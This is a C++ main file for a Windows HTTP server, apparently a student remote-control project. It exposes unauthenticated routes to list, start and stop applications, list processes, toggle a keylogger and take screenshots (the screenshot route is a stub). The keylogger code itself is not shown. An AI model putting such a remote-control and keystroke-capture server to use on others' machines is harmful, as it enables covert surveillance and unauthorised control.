#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include "config.h"
#include "http_utils.h"
#include "router.h"
#include "apps.h"
#include "processes.h"
#include "keylogger.h"

int main() {
    // 1. Khởi tạo Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // 2. Tạo socket
    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_fd == INVALID_SOCKET) {
        std::cerr << "socket failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    // 3. Bind
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed: " << WSAGetLastError() << "\n";
        closesocket(server_fd);
        WSACleanup();
        return 1;
    }

    // 4. Listen
    if (listen(server_fd, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed: " << WSAGetLastError() << "\n";
        closesocket(server_fd);
        WSACleanup();
        return 1;
    }

    std::cout << "Server running at http://localhost:" << PORT << "\n";

    // 5. Vòng lặp chính
    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) {
            continue;
        }

        char buffer[BUFFER_SIZE];
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);

        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            std::string request(buffer);
            
            // Log request đơn giản để debug
            std::string route;
            std::map<std::string, std::string> query = parse_request_path(request, route);
            std::cout << "Request: " << route << "\n";

            std::string response_body;
            std::string content_type = "text/html";
            bool is_404 = false;

            // --- ROUTING (ĐỊNH TUYẾN) ---

            // 1. Phục vụ Frontend Files
            if (route == "/") {
                // Giả định file exe nằm ở server/build, nên lùi 2 cấp để ra thư mục gốc project
                response_body = load_file("../frontend/index.html");
                if (response_body.empty()) { response_body = "<h1>Error: Cannot find index.html</h1>"; }
            } 
            else if (route == "/style.css") {
                response_body = load_file("../frontend/style.css");
                content_type = "text/css";
            } 
            else if (route == "/script.js") {
                response_body = load_file("../frontend/script.js");
                content_type = "application/javascript";
            }
            
            // 2. Phục vụ API (Logic điều khiển)
            else if (route == "/apps") {
                response_body = list_apps();
            } 
            else if (route == "/apps/start") {
                std::string app_name = query.count("app") ? query["app"] : "";
                start_app(app_name);
                response_body = "Started: " + app_name;
            } 
            else if (route == "/apps/stop") {
                std::string app_name = query.count("app") ? query["app"] : "";
                stop_app(app_name);
                response_body = "Stopped: " + app_name;
            } 
            else if (route == "/processes") {
                response_body = list_processes();
            } 
            else if (route == "/keylogger") {
                response_body = keylog_control();
            } 
            else if (route == "/screenshoot") { 
                response_body = "Screenshot logic here"; 
            }
            else {
                is_404 = true;
                response_body = "<h1>404 Not Found</h1>";
            }

            // Gửi phản hồi
            std::string http_response;
            if (is_404) {
                http_response = "HTTP/1.1 404 Not Found\r\nContent-Length: " + std::to_string(response_body.size()) + "\r\n\r\n" + response_body;
            } else {
                http_response = create_response(response_body, content_type);
            }
            
            send(client_socket, http_response.c_str(), http_response.length(), 0);
        }

        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}